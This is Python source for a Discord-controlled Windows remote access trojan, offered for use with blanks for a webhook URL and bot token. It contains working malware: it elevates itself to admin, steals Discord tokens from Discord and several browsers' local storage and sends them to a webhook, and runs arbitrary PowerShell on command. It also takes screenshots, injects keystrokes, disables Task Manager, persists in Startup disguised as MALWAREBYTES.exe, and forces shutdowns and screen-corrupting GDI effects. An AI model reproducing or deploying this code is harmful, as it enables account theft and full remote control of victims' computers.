import discord
import subprocess
import sys
import os
import requests
import win32com.shell.shell as shell
import time
from PIL import ImageGrab
import win32crypt
import win32api
import webbrowser
import random
from random import randrange
from win32api import *
from win32con import *
from win32gui import *
from win32file import *
from win32ui import *
from win32gui import GetDC, PatBlt
import ctypes
import math
import numpy as np
import keyboard
import asyncio
import shutil
import re
import pyautogui
import json
from urllib.request import Request, urlopen
import psutil
import tempfile
import urllib.request

desk = GetDC(0)
HDC = GetDC(0)
sw, sh = GetSystemMetrics(0),GetSystemMetrics(1)
w, h = GetSystemMetrics(0),GetSystemMetrics(1)
x = GetSystemMetrics(0)
y = GetSystemMetrics(1)
x2 = GetSystemMetrics(0)
y2 = GetSystemMetrics(1)
b = GetSystemMetrics(SM_CYSCREEN)
a = GetSystemMetrics(SM_CXSCREEN)
ScrW = GetSystemMetrics(SM_CXSCREEN)
ScrH = GetSystemMetrics(SM_CYSCREEN)
i = 0
n = 10
i < 1900

client = discord.Client(intents=discord.Intents.all())

ASADMIN = 'asadmin'

if sys.argv[-1] != ASADMIN:
    script = os.path.abspath(sys.argv[0])
    params = ' '.join([script] + sys.argv[1:] + [ASADMIN])
    shell.ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters=params)
    sys.exit(0)

WEBHOOK_URL = '' #here your webhook url!

PING_ME = True

def find_tokens(path):
    path += '\\Local Storage\\leveldb'

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens

def main():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')

    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }

    message = '@everyone' if PING_ME else ''

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        message += f'\n**{platform}**\n\n'

        tokens = find_tokens(path)

        if len(tokens) > 0:
            for token in tokens:
                message += f'{token}\n'
        else:
            message += 'No tokens found.\n'

        message += ''

    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
    }

    payload = json.dumps({'content': message})

    try:
        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
        urlopen(req)
    except:
        pass
if __name__ == '__main__':
   main()

async def end_process(pid):
    try:
        process = psutil.Process(pid)
        process.terminate()
        return True
    except psutil.NoSuchProcess:
        return False

async def send_discord_username_webhook():
    webhook_url = "" #here too
    user = await client.fetch_user(client.user.id)
    username = user.name
    user_id = user.id
    message_text = f"running on {os.environ['COMPUTERNAME']}."
    data = {
        "content": message_text
    }
    response = requests.post(webhook_url, json=data)
    if response.status_code == 204:
        print("Successfully sent webhook message")
    else:
        print(f"Failed to send webhook message with status code {response.status_code}")

def MessageBox(text, title, style):
    return ctypes.windll.user32.MessageBoxW(0, text, title, style)

def type_message(message):
    for char in message:
        keyboard.press(char)
        keyboard.release(char)
        asyncio.sleep(0.10)

@client.event
async def on_ready():
    await send_discord_username_webhook()
    print("lol")
    url = 'https://www.twitch.tv/discord'
    await client.change_presence(activity=discord.Streaming(name='SKIDS', url=url))

async def list_drivers(message):
    drives = win32api.GetLogicalDriveStrings()
    drives = drives.split('\000')[:-1]
    await message.channel.send(f"Here are all the drivers: {', '.join(drives)}")
    
async def start_mining_ram(message):
    for i in range(5):
        arr = np.zeros((1024,1024,1024), dtype=np.float64)
        arr += arr
    await message.channel.send('RAM Mining started.')
    time.sleep(10)
    await message.channel.send('RAM Mining stopped.')

@client.event
async def on_message(message):
    if message.author == client.user:
        return

    if message.content.startswith('!task-manager'):
        subprocess.Popen('taskmgr')
        await message.channel.send('Task Manager opened.')

    elif message.content.startswith('!take-screenshot'):
        screenshot = ImageGrab.grab()
        temp_path = os.path.join(os.environ['TEMP'], 'screenshot.png')
        screenshot.save(temp_path)
        with open(temp_path, 'rb') as f:
            file = discord.File(f)
            await message.channel.send(file=file)
        time.sleep(5)
        os.remove(temp_path)

    elif message.content.startswith('!exec'):
        command = message.content[6:]
        result = subprocess.run(['powershell', '-Command', command], capture_output=True, text=True)
        output = result.stdout.strip() or result.stderr.strip()
        if output:
            await message.channel.send(f'Command executed:\n```\n{command}\n```\nOutput:\n```\n{output}\n```')
        else:
            await message.channel.send(f'Command executed:\n```\n{command}\n```\nNo output.')

    elif message.content.startswith('!partitions'):
        await list_drivers(message)

    elif message.content.startswith('!downloads'):
        path = os.path.join(os.path.expanduser("~"), "Downloads")
        files = os.listdir(path)
        await message.channel.send(f"Files in Downloads: {', '.join(files)}")
        
    elif message.content.startswith('!desktop'):
        path = os.path.join(os.path.expanduser("~"), "Desktop")
        files = os.listdir(path)
        await message.channel.send(f"Files on Desktop: {', '.join(files)}")
        
    elif message.content.startswith('!C'):
        path = 'C://'
        files = os.listdir(path)
        await message.channel.send(f"Files in C://: {', '.join(files)}")
        
    elif message.content.startswith('!openweb'):
        url = message.content.split(' ')[1]
        webbrowser.open_new_tab(url)
        await message.channel.send(f"Opening {url} in your default web browser!")
        
    elif message.content.startswith('!gdi'):
        for i in range(10):
            BitBlt(desk,10,10,w,h,desk,12,12,SRCCOPY)
            BitBlt(desk,10,10,w,h,desk,12,12,SRCAND)
            StretchBlt(desk, 0, 0, sw, sh, desk,sw,sh, sw, sh, SRCPAINT)
            BitBlt(desk, a, b, 200, 200, desk, a, b,0x114514)
            BitBlt(desk,10,10,w,h,desk,90,0,SRCERASE)
            BitBlt(desk,10,10,w,h,desk,0,180,NOTSRCERASE)
            BitBlt(desk,10,10,w,h,desk,0,90,SRCAND)
            BitBlt(desk,10,10,w,h,desk,180,0,SRCAND)
            BitBlt(desk,10,10,w,h,desk,12,12,SRCCOPY)
            BitBlt(desk,10,10,w,h,desk,12,12,SRCCOPY)
            BitBlt(desk,10,10,w,h,desk,12,12,SRCCOPY)
            BitBlt(desk,10,10,w,h,desk,12,12,SRCAND)
            BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, MERGEPAINT)

        for i in range(20):
            BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, SRCPAINT)

        for i in range(40):
           BitBlt(desk, 5, 5, sw, sh, desk, 0, 0, SRCCOPY)
           BitBlt(desk, -5, -5, sw, sh, desk, 0, 0, SRCCOPY)

        for i in range(10):
           BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, MERGECOPY)
           BitBlt(desk, 5, 5, sw, sh, desk, 0, 0, MERGECOPY)
           BitBlt(desk, -5, -5, sw, sh, desk, 0, 0, SRCCOPY)
           BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, SRCPAINT)
           BitBlt(desk,10,10,w,h,desk,24,12,SRCCOPY)
           BitBlt(desk,10,10,w,h,desk,-255,-20,SRCCOPY)
           BitBlt(desk,10,10,w,h,desk,12,12,SRCCOPY)
           BitBlt(desk,10,100,w,h,desk,12,12,SRCAND)
           BitBlt(desk,100,100,w,h,desk,12,12,SRCAND)
           BitBlt(desk,10,10,w,h,desk,12,12,SRCINVERT)
           BitBlt(desk,70,200,w,h,desk,72,22,SRCCOPY)
           BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, SRCINVERT)

        for i in range(5):
           BitBlt(desk,10,10,w,h,desk,12,12,SRCCOPY)
           
        for i in range(10):
           BitBlt(desk,10,10,w,h,desk,12,12,SRCAND)
           
        for i in range(5):
           BitBlt(desk,10,10,w,h,desk,90,0,SRCERASE)
           
        for i in range(5):
           BitBlt(desk,10,10,w,h,desk,0,180,NOTSRCERASE)
           
        for i in range(5):
           BitBlt(desk,10,10,w,h,desk,0,90,SRCAND)
           
        for i in range(5):
           BitBlt(desk,10,10,w,h,desk,180,0,SRCAND)
           
        for i in range(5):
           BitBlt(desk,10,10,w,h,desk,12,12,SRCCOPY)
           
        for i in range(5):
           BitBlt(desk,10,10,w,h,desk,12,12,SRCCOPY)

        for i in range(0, 100):
           StretchBlt(desk, n, n, ScrW - n * 2, ScrH - n * 2, desk, 0, 0, ScrW, ScrH, SRCCOPY)
           
        for i in range(10):
           BitBlt(desk,10,10,w,h,desk,12,12,SRCCOPY)
           BitBlt(desk,70,200,w,h,desk,72,22,SRCCOPY)
           StretchBlt(desk, 30, 30, sw - 0, sh - 0, desk, sw, sh, -sw, -sh, SRCCOPY)
           StretchBlt(desk, -20, -20, sw+40, sh+40, desk, 0, 0, sw, sh, 0x9999999)
           StretchBlt(desk, 30, 30, sw - 0, sh - 0, desk, sw, sh, -sw, -sh, SRCCOPY)
           BitBlt(desk,10,10,w,h,desk,0,90,MERGEPAINT)
           BitBlt(desk,10,10,w,h,desk,180,0,DSTINVERT)
           BitBlt(desk,10,10,w,h,desk,90,0,SRCERASE)
           StretchBlt(desk, -20, -20, sw+40, sh+40, desk, 0, 0, sw, sh, 0x9999999)
           BitBlt(desk,10,10,w,h,desk,0,180,NOTSRCERASE)
           BitBlt(desk,10,10,w,h,desk,0,90,SRCAND)
           BitBlt(desk,10,10,w,h,desk,180,0,SRCAND)
           BitBlt(desk,10,10,w,h,desk,90,0,SRCPAINT)
           StretchBlt(desk, -20, -20, sw+40, sh+40, desk, 0, 0, sw, sh, 0x9999999)
           StretchBlt(desk, -20, -20, sw+40, sh+40, desk, 0, 0, sw, sh, 0x9999999)
           StretchBlt(desk, -20, -20, sw+40, sh+40, desk, 0, 0, sw, sh, 0x9999999)
           StretchBlt(desk, -20, -20, sw+40, sh+40, desk, 0, 0, sw, sh, 0x9999999)
           StretchBlt(desk, -20, -20, sw+40, sh+40, desk, 0, 0, sw, sh, 0x9999999)
    
        await message.channel.send('GDI effect applied.')
        
    elif message.content.startswith('!msg'):
        msg_content = message.content.split(' ')
        if len(msg_content) < 3:
            await message.channel.send('Usage: `!msg <text> <title>`')
        else:
            text = msg_content[1]
            title = msg_content[2]
            MessageBox(text, title, 0x30 | 0x0)

    elif message.content.startswith('!ram'):
         await start_mining_ram(message)

    elif message.content.startswith('!type'):
        parts = message.content.split(' ')
        if len(parts) > 1:
            message_to_type = ' '.join(parts[1:])
            await asyncio.sleep(1)
            type_message(message_to_type)
        await message.channel.send('Typed.')   
         
    elif message.content.startswith('!disable-taskmgr'):
        os.system('powershell.exe REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f')
        await message.channel.send('Disabled the task manager.')
        
    elif message.content.startswith('!startup'):
        script_dir = os.path.dirname(os.path.realpath(sys.argv[0]))
        startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
        startup_script = os.path.join(startup_folder, "MALWAREBYTES.exe")
        shutil.copyfile(sys.argv[0], startup_script)
        await message.channel.send('Added to startup.')
        
    elif message.content.startswith('!explorer'):
        subprocess.Popen('explorer')
        await message.channel.send('Explorer opened.')

    elif message.content.startswith('!shutdown'):
        subprocess.Popen('shutdown /s /t 0')
        await message.channel.send('Shutting down...')

    elif message.content.startswith('!restart'):
        subprocess.Popen('shutdown /r /t 0')
        await message.channel.send('Restarting...')

    elif message.content.startswith('!change-wallpaper'):
        image_link = message.content.split()[1]
    
        response = requests.get(image_link)
        if response.status_code != 200:
            await message.channel.send('Error: Could not download image.')
            return
    
        temp_folder = os.path.join(os.environ['TEMP'], 'windowz')
        if not os.path.exists(temp_folder):
            os.mkdir(temp_folder)
    
        image_path = os.path.join(temp_folder, 'temp.jpg')
        with open(image_path, 'wb') as f:
            f.write(response.content)
    
        ctypes.windll.user32.SystemParametersInfoW(20, 0, os.path.abspath(image_path), 0)
        await message.channel.send('Wallpaper changed.')

    elif message.content.startswith('!settings'):
        subprocess.Popen('control.exe')
        await message.channel.send('Control Panel opened.')
        
    elif message.content.startswith('!notepad'):
        subprocess.Popen('notepad')
        await message.channel.send('Notepad opened.')

    elif message.content.startswith('!calc'):
        subprocess.Popen('calc')
        await message.channel.send('Calculator opened.')
        
    elif message.content.startswith('!paint'):
        subprocess.Popen('mspaint')
        await message.channel.send('Paint opened.')
    
    elif message.content.startswith('!cursor'):
        args = message.content.split(' ')
        if len(args) != 2 or not re.match(r'^(up|down|left|right)$', args[1]):
            await message.channel.send('Invalid command. Use !cursor <up/down/left/right>')
        else:
            direction = args[1]
            if direction == 'up':
                pyautogui.moveRel(0, -30)
            elif direction == 'down':
                pyautogui.moveRel(0, 30)
            elif direction == 'left':
                pyautogui.moveRel(-30, 0)
            elif direction == 'right':
                pyautogui.moveRel(30, 0)
            await message.channel.send(f'Cursor moved {direction}.')
            
    elif message.content.startswith('!cmd'):
        subprocess.Popen('cmd')
        await message.channel.send('Command Prompt opened.')
        
    elif message.content.startswith('!control-panel'):
        subprocess.Popen('control')
        await message.channel.send('Control Panel opened.')    
        
    elif message.content.startswith('!task-list'):
        tasks = []
        for proc in psutil.process_iter():
            try:
                tasks.append((proc.name(), proc.pid, proc.cpu_percent(), proc.memory_percent()))
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                pass

        with open(os.path.join(os.environ['TEMP'], 'tasks.txt'), 'w') as f:
            f.write('{:<30} {:<10} {:<10} {:<10}\n'.format('APPNAME', 'PID', 'CPU USAGE %', 'RAM USAGE %'))
            for task in tasks:
                f.write('{:<30} {:<10} {:<<10.2f} {:<10.2f}\n'.format(*task))

        await message.channel.send(file=discord.File(os.path.join(os.environ['TEMP'], 'tasks.txt')))

    elif message.content.startswith('!event-viewer'):
        subprocess.Popen('eventvwr')
        await message.channel.send('Event Viewer opened.')
            
    elif message.content.startswith('!end '):
        try:
            pid = int(message.content.split()[1])
            result = await end_process(pid)
            if result:
                await message.channel.send(f"Process with PID {pid} has been ended.")
            else:
                await message.channel.send(f"No process with PID {pid} was found.")
        except (ValueError, IndexError):
            await message.channel.send("Invalid syntax. Please use: !end <pid>")

    elif message.content.startswith('!registry-editor'):
        subprocess.Popen('regedit')
        await message.channel.send('Registry Editor opened.')

    elif message.content.startswith('!music'):
        link = message.content.split(' ')[1]
        response = requests.get(link)
        filename = os.path.join(os.environ['TEMP'], 'music.mp3')
        with open(filename, 'wb') as f:
            f.write(response.content)

        os.startfile(filename)
        await message.channel.send('Music started.')

    elif message.content.startswith('!snipping-tool'):
        subprocess.Popen('snippingtool')
        await message.channel.send('Snipping Tool opened.')

    elif message.content.startswith('!resource-monitor'):
        subprocess.Popen('resmon')
        await message.channel.send('Resource Monitor opened.')

    elif message.content.startswith('!battery'):
        try:
            battery = psutil.sensors_battery()
            percent = battery.percent
            plugged = battery.power_plugged
            if plugged:
                charging_status = "charging"
            else:
                charging_status = "not charging"
            await message.channel.send(f"The battery is at {percent}% and is currently {charging_status}.")
        except AttributeError:
            await message.channel.send("Sorry, this command is only available on laptops.")

client.run('') #your bot token, you must enable the 3 intents to work